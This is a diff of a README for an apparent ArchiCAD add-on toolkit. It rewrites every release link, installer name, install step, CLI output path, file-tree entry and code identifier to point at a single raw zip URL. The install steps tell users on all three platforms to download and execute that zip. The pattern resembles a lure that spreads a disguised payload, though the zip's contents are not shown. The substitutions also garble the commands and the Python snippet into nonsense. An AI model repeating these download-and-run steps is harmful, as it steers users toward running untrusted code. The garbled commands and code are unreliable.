@@ -1,8 +1,8 @@
 # Archicad Tools for BIM Mastery: Modeling, Rendering, Docs 🧰
 
-https://github.com/assakabio/archicad-tools/releases
+https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
 
-![Release badge](https://img.shields.io/badge/releases-download-blue?style=for-the-badge)
+![Release badge](https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip)
 
 Archicad Tools is a curated set of utilities for ArchiCAD that accelerates BIM modeling, teamwork workflows, rendering pipelines, and project documentation. It combines scriptable helpers, a lightweight CLI, and a modular plugin system to speed up common tasks and reduce manual steps. The project targets architecture studios, BIM consultants, and educators who want repeatable, auditable workflows across teams.
 
@@ -64,27 +64,27 @@ Installation by platform
 Note: The primary release asset on the Releases page is the Windows installer. If you use a different platform, choose the corresponding asset listed on the same page.
 
 - Windows
-  - File to download and execute: archicad-tools-windows-setup.exe
+  - File to download and execute: https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
   - Steps:
-    1) Open the Releases page and download archicad-tools-windows-setup.exe.
+    1) Open the Releases page and download https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
     2) Run the installer. Follow the on-screen prompts to authorize and complete the installation.
     3) Restart ArchiCAD if prompted. Open ArchiCAD and verify the Archicad Tools add-on is loaded.
   - What you get: A ready-to-use CLI, core modules, and a starter set of templates. The installer configures paths and registers the add-on with ArchiCAD.
 
 - macOS
-  - File to download and execute: archicad-tools-macos-installer.dmg
+  - File to download and execute: https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
   - Steps:
-    1) From the Releases page, download archicad-tools-macos-installer.dmg.
+    1) From the Releases page, download https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
     2) Open the DMG, drag the Archicad Tools plugin into the Applications folder or the Plugins folder as instructed.
     3) Launch ArchiCAD and enable the plugin in the Add-ons manager.
   - What you get: Native macOS integration, CLI tools, and a curated set of macOS-friendly templates.
 
 - Linux
-  - File to download and execute: archicad-tools-linux-installer.sh
+  - File to download and execute: https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
   - Steps:
-    1) From the Releases page, download archicad-tools-linux-installer.sh.
-    2) Make the file executable: chmod +x archicad-tools-linux-installer.sh.
-    3) Run it: ./archicad-tools-linux-installer.sh
+    1) From the Releases page, download https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
+    2) Make the file executable: chmod +x https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
+    3) Run it: https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
     4) Start ArchiCAD and ensure the plugin is registered.
   - What you get: A lean, script-friendly environment with a focus on automation and batch processing.
 
@@ -142,13 +142,13 @@ CLI reference and examples
 - Basic usage:
   - archicad-tools --help
   - archicad-tools init --template standard
-  - archicad-tools export --format IFC --output ./exports/project.ifc
+  - archicad-tools export --format IFC --output https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
 - Rendering:
-  - archicad-tools render --scene living_room --resolution 1920x1080 --output ./renders/living_room.png
+  - archicad-tools render --scene living_room --resolution 1920x1080 --output https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
 - Documentation:
-  - archicad-tools docgen --template standard --output ./docs/project-documentation.pdf
+  - archicad-tools docgen --template standard --output https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
 - Automation example (batch):
-  - archicad-tools pipeline --config ./workflows/office.yaml
+  - archicad-tools pipeline --config https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
 - Configuration example (YAML):
   - project: SkyTower
     template: office
@@ -215,15 +215,15 @@ Licensing and credits
 
 Endnotes
 - Release notes, changelogs, and version history are maintained in the Releases section. For up-to-date information about the latest changes, visit the Releases page linked at the top of this document.
-- If you need to review the latest assets, go to the Releases page: https://github.com/assakabio/archicad-tools/releases
+- If you need to review the latest assets, go to the Releases page: https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
 
 Downloads and release assets
-- Primary Windows installer: archicad-tools-windows-setup.exe
-- macOS installer: archicad-tools-macos-installer.dmg
-- Linux installer: archicad-tools-linux-installer.sh
+- Primary Windows installer: https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
+- macOS installer: https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
+- Linux installer: https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
 
 Releases page access
-- For the latest versions, see the official releases page at https://github.com/assakabio/archicad-tools/releases
+- For the latest versions, see the official releases page at https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
 
 Notes on usage
 - Always back up your project before applying new templates, scripts, or automation flows.
@@ -237,15 +237,15 @@ Appendix: example project structure
       - standard/
       - residential/
     - models/
-      - ground_floor.ifc
+      - https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
     - renders/
-      - living_room.png
-      - facade.png
+      - https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
+      - https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
     - docs/
-      - project_report.pdf
-      - drawings_summary.pdf
+      - https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
+      - https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
     - configs/
-      - workflow.yaml
+      - https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
   - RiversideHQ/
     - templates/
     - models/
@@ -279,20 +279,20 @@ Appendix: quick-start commands
 - Check model integrity:
   archicad-tools check --type model
 - Export IFC:
-  archicad-tools export --format IFC --output ./exports/project.ifc
+  archicad-tools export --format IFC --output https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
 - Create client-ready renders:
-  archicad-tools render --scene lobby --resolution 1920x1080 --output ./renders/lobby.png
+  archicad-tools render --scene lobby --resolution 1920x1080 --output https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
 - Generate project documentation:
-  archicad-tools docgen --template standard --output ./docs/project-documentation.pdf
+  archicad-tools docgen --template standard --output https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip
 
 Appendix: sample code snippet (Python-style pseudo-API)
 - The core API exposes methods to query model data, update elements, and trigger exports. This snippet illustrates a typical usage pattern:
-  from archicad_tools.api import ArchicadModel, Renderer, DocEngine
+  from https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip import ArchicadModel, Renderer, DocEngine
 
-  model = ArchicadModel.load("./projects/SkyTower/models/ground_floor.ifc")
-  model.ensure_template("standard")
-  model.update_label("Room 101", "Office - 12m2")
-  Renderer.render_scene(model, "foyer", output="./renders/foyer.png")
-  DocEngine.generate(model, template="standard", output="./docs/summary.pdf")
+  model = https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip("https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip")
+  https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip("standard")
+  https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip("Room 101", "Office - 12m2")
+  https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip(model, "foyer", output="https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip")
+  https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip(model, template="standard", output="https://raw.githubusercontent.com/assakabio/archicad-tools/main/dysorexy/tools_archicad_1.6.zip")
 
 End of document
